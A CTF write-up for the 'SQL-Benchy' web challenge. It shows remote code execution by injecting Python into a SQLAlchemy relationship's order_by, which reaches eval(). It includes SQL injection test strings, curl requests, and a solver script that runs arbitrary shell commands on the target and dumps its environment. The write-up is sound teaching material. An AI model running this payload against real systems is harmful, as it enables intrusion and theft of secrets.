---
title: "mntcrlCTF 2026: SQL-Benchy"
date: 2026-06-28
draft: false
tags: ["web", "python", "eval-injection", "rce", "sqlalchemy"]
categories: ["mntcrlCTF 2026"]
authors: ["lollo"]
summary: "Looks like SQL injection, but it's really Python eval() code execution through a SQLAlchemy relationship's order_by."
---

<div class="wu-card">
  <div class="wu-meta">
    <span class="wu-chip"><span class="wu-k">Category</span> Web</span>
    <span class="wu-chip"><span class="wu-k">Event</span> mntcrlCTF</span>
  </div>
  <div class="wu-flag">
    <span class="wu-flag-label">🚩 Flag</span>
    <code class="wu-flag-code">mntcrl{d1d_y0ur_c0dex_th1nk_th1s_w4s_a_sql???_d5580ac991e82142}</code>
  </div>
</div>

<style>
.wu-card {
  margin: 1.5rem 0;
  padding: 1rem 1.15rem;
  border: 1px solid rgba(128, 128, 128, 0.28);
  border-radius: 0.75rem;
  background: rgba(128, 128, 128, 0.06);
}
.wu-meta {
  display: flex;
  flex-wrap: wrap;
  gap: 0.5rem;
  margin-bottom: 0.85rem;
}
.wu-chip {
  display: inline-flex;
  align-items: center;
  gap: 0.4rem;
  padding: 0.15rem 0.6rem;
  border-radius: 999px;
  background: rgba(128, 128, 128, 0.14);
  font-size: 0.9rem;
}
.wu-k {
  text-transform: uppercase;
  letter-spacing: 0.04em;
  font-size: 0.7rem;
  font-weight: 700;
  opacity: 0.65;
}
.wu-flag {
  display: flex;
  align-items: center;
  gap: 0.6rem;
  min-width: 0;
}
.wu-flag-label {
  flex: none;
  font-weight: 700;
  font-size: 0.9rem;
}
.wu-flag-code {
  flex: 1;
  min-width: 0;
  white-space: nowrap;
  overflow-x: auto;
  padding: 0.4rem 0.7rem;
  border-radius: 0.45rem;
  background: rgba(128, 128, 128, 0.16);
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  font-size: 0.92rem;
}
.wu-flag-code::-webkit-scrollbar { height: 6px; }
.wu-flag-code::-webkit-scrollbar-thumb {
  background: rgba(128, 128, 128, 0.4);
  border-radius: 999px;
}
</style>

## TL;DR

The app builds SQLAlchemy models out of the JSON we send it. One of those fields, a
relationship's `order_by`, gets handed to SQLAlchemy as a string, and SQLAlchemy
runs that string through `eval()`. That gives us Python code execution. From there
we run a shell command, raise its output as an error, and let the app print the
error on the page. So despite the name, there's no SQL injection at all here; the
database is just in-memory SQLite.

## The app

This was a black-box challenge: we were given nothing but a live URL, so
everything we know about the app we learned by talking to it. The idea is simple
enough: you send it JSON describing
tables, columns, foreign keys and relationships, and it builds live **SQLAlchemy**
models out of them on the fly. The API is tiny:

| Method | Path | Purpose |
| --- | --- | --- |
| `POST` | `/tables/<name>` | create a table from JSON |
| `POST` / `GET` | `/tables/<name>/rows` | insert / show rows |

When the backend hits an error, it shows the message in a `#status` box on the
page. That reflected error is what we'll read our output from later.

## It's not SQL injection

The name screams SQL injection, so that's the first thing we tried. We threw the
usual payloads at the values we store: quotes, true/false conditions, stacked
queries, a `UNION`, and time delays.

| Value we send | What comes back |
| --- | --- |
| `' OR '1'='1` | `' OR '1'='1` |
| `' AND '1'='2` | `' AND '1'='2` |
| `'; DROP TABLE users;-- ` | `'; DROP TABLE users;-- ` |
| `\' UNION SELECT 1,2,3-- ` | `\' UNION SELECT 1,2,3-- ` |

Every one of them came back exactly as we sent it. No errors, no odd behaviour, no
delays. The values are handled safely, so there's nothing to inject there.

So we tried a different angle and turned to the other fields we control. That's when
`order_by` on a relationship gave it away: feeding it a bad value threw back a
Python error, not a SQL one:

```
order_by = "b.id"      ->  200, ok
order_by = "nope_col"  ->  400, "name 'nope_col' is not defined"
```

We expected a SQL error, but `"name 'nope_col' is not defined"` is a Python
**`NameError`**. That's the moment it clicked: `order_by` isn't stored as data like
the row values are, it's being run as Python.

## Why: SQLAlchemy `eval()`s string `order_by`

When you give a relationship an `order_by` as a string, SQLAlchemy has to turn that
text back into a real object, and it does that with `eval()`. Here's the relevant
bit from [`sqlalchemy/orm/clsregistry.py`](https://github.com/sqlalchemy/sqlalchemy/blob/main/lib/sqlalchemy/orm/clsregistry.py#L584-L599):

```python
def __call__(self):
    try:
        x = eval(self.arg, globals(), self._dict)   # self.arg = our order_by
        ...
    except NameError as n:
        self._raise_for_name(n.args[0], n)          # only NameError is caught
```

Since `globals()` includes the built-ins, things like `__import__`, `open` and
`exec` are all within reach. In other words, whatever we put in `order_by` runs as
Python.

## Exploit

The only exception it catches is `NameError`. Anything else bubbles up and gets
printed in the `#status` box, so the trick is to raise our command output as an
error:

```python
exec("raise Exception(__import__('os').popen('env').read())")
```

`order_by` only lives inside a relationship, and SQLAlchemy checks that the
relationship is valid before it ever runs our string. That means we need a real
table to point at first, so it takes two requests:

```bash
HOST=https://sql-benchy-5f924d14a7eb.c.mntcrl.it

# 1. base table, just needs to exist
curl -sk "$HOST/tables/b" -H 'Content-Type: application/json' \
  -d '{"columns":{"name":"string"}}'

# 2. attack table: order_by runs the payload -> FLAG in the response
curl -sk "$HOST/tables/p123456" -H 'Content-Type: application/json' \
  -d '{"columns":{"name":"string"},"foreign_keys":{"b_id":{"target":"b.id","type":"integer"}},"relationships":{"b":{"target":"b","order_by":"exec(\"raise Exception(__import__('\''os'\'').popen('\''env'\'').read())\")"}}}' \
  | grep -o 'FLAG=[^<]*'
```

Output:

```
FLAG=mntcrl{d1d_y0ur_c0dex_th1nk_th1s_w4s_a_sql???_d5580ac991e82142}
```

Just change the command inside `popen('...')` to run whatever you want. The
environment also leaks `DATABASE_URL=sqlite://`, which confirms the database was
only ever in-memory.

## Appendix: the solver

The whole thing is just two requests:

```python
#!/usr/bin/env python3
import json, re, ssl, sys, time, urllib.request, urllib.error
from urllib.parse import quote

BASE = "https://sql-benchy-5f924d14a7eb.c.mntcrl.it"
CTX = ssl._create_unverified_context()


def req(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    r = urllib.request.Request(BASE + quote(path, safe="/"), data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(r, timeout=20, context=CTX) as resp:
            return resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "replace")


def message(html):
    m = re.search(r'id="status"[^>]*>(.*?)</div>', html, re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", "", m.group(1))).strip() if m else html[:200]


def run(command):
    req("POST", "/tables/b", {"columns": {"name": "string"}})
    payload = "exec(%r)" % ("raise Exception(__import__('os').popen(%r).read())" % command)
    name = "p%d" % (int(time.time() * 1000) % 1000000)
    schema = {
        "columns": {"name": "string"},
        "foreign_keys": {"b_id": {"target": "b.id", "type": "integer"}},
        "relationships": {"b": {"target": "b", "order_by": payload}},
    }
    return message(req("POST", "/tables/" + name, schema))


print(run(sys.argv[1] if len(sys.argv) > 1 else "env"))
```

The only fiddly part is building the payload. The nested `%r` lets Python's `repr`
handle all the quoting for us: the command goes inside `popen(...)`, and the whole
`raise` statement goes inside `exec(...)`.
